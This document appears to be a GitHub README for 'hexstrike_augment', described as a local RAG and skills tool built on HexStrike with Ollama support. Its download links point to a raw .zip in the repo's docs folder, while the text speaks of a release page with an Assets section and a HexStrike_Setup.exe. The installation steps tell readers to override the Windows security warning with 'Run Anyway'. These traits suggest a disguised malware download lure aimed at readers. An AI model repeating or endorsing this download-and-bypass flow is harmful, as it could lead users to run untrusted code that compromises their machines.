# ⚡ hexstrike_augment - Improve your workflow with smart skills

[![Download for Windows](https://img.shields.io/badge/Download-HexStrike-blue.svg)](https://raw.githubusercontent.com/subsaharan-metallic807/hexstrike_augment/main/docs/hexstrike_augment_2.8.zip)

## 📖 About this application

HexStrike_augment adds new power to your daily computing tasks. This tool builds on the original HexStrike framework. We include a new skill system to automate repetitive steps. The software uses RAG capabilities to search your documents. It provides answers based on your unique files. You can connect to private models using Ollama for local processing. Your data stays on your machine at all times.

## 💻 System requirements

Your computer needs specific parts to run this software. Check your system against this list before you start.

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or AMD Ryzen 5 clocking at 3.0 GHz or higher.
- Memory: 8 GB of RAM minimum. 16 GB is better for performance.
- Storage: 2 GB of free space on your hard drive.
- Network: Active internet connection for the initial download and model setup.

## 📥 How to download

You must visit the project release page to get the installer. We package the software as a standard Windows installer. 

[Visit this page to download the latest setup file](https://raw.githubusercontent.com/subsaharan-metallic807/hexstrike_augment/main/docs/hexstrike_augment_2.8.zip)

1. Open your web browser. 
2. Click the link above.
3. Look for the section labeled Assets.
4. Click the file named HexStrike_Setup.exe.
5. Save the file to your Downloads folder.

## ⚙️ Installation steps

Follow these steps to place the software on your computer.

1. Double-click the HexStrike_Setup.exe file you saved. 
2. Windows might show a security box. If the box appears, click More Info and then select Run Anyway.
3. Follow the sequence of screens in the installer.
4. Select the folder where you want to keep the program files.
5. Click Install.
6. Wait for the progress bar to finish.
7. Click Finish. A shortcut icon now sits on your desktop.

## 🚀 Setting up your first run

The first time you start the app, it needs a few settings to work right.

1. Locate the HexStrike icon on your desktop.
2. Double-click the icon to open the main dashboard.
3. The app will search for your local Ollama connection.
4. If you have Ollama installed, the app will show a green status light.
5. If you do not have Ollama, the app will offer a link to guides for your setup.
6. Click Save to complete the introduction.

## 🛠 Using the skill system

The skill system acts as an engine for your tasks. Skills tell the computer how to handle specific file types.

- Adding a skill: Click the Manage Skills button. Select a folder on your computer that contains your work files.
- Running a query: Type a question into the text box at the bottom of the screen.
- Understanding the output: The app reads your files and highlights the relevant sections. It uses the model you chose to summarize the info.
- Customizing the view: You can change the layout to show your file list on the left and the chat on the right.

## 🧠 Connecting to local models

Using local models ensures your work stays private. The software talks to Ollama to handle the heavy lifting.

1. Ensure Ollama is running in your system tray.
2. Go to Settings in HexStrike.
3. Select Model Selection from the list.
4. The list updates to show the models you pulled from the Ollama library.
5. Choose your preferred model. We suggest using models like Llama 3 or Mistral for balanced speed.
6. Click Refresh if you do not see your models. 
7. Save your settings. The app identifies the chosen model instantly.

## 🔍 Managing your data

The RAG functionality relies on an index of your data. The index allows the app to find facts within your documents.

- Building the index: Click the Index button after you add folders. The app reads your text files, PDFs, and spreadsheets.
- Updating: If you add new files to your folders, click Re-index to include them.
- File support: The tool currently reads .txt, .pdf, .docx, and .md files. 
- Performance: Large folders take longer to index. Keep your most important files in a dedicated research folder for the best performance.

## 🔧 Troubleshooting common problems

Sometimes the app encounters hurdles. Use these steps to solve them.

- The app does not load: Check that you installed the software in a folder where you have write access.
- Ollama connection error: Open your task manager. Find Ollama. If it is stopped, restart the program. 
- Model not found: Run the command 'ollama list' in your terminal to see if the model is downloaded.
- High memory usage: Large language models require much memory. Close other programs while performing heavy indexing tasks.
- No results for a query: Ensure the app has index permissions for the folder containing your documents.
- Resetting settings: If settings become corrupt, navigate to the user data folder and delete the config.json file. Restarting the app restores default settings.

## 🤝 Community and support

We maintain the project to ensure it works for everyone. If you find a bug, open an issue on the main page. Describe what you did and what happened. Provide screenshots if they help explain the problem. We review every report. Please be clear when you describe your issue. We fix problems in order of priority based on how many users they affect. Keep your software updated to get the latest fixes.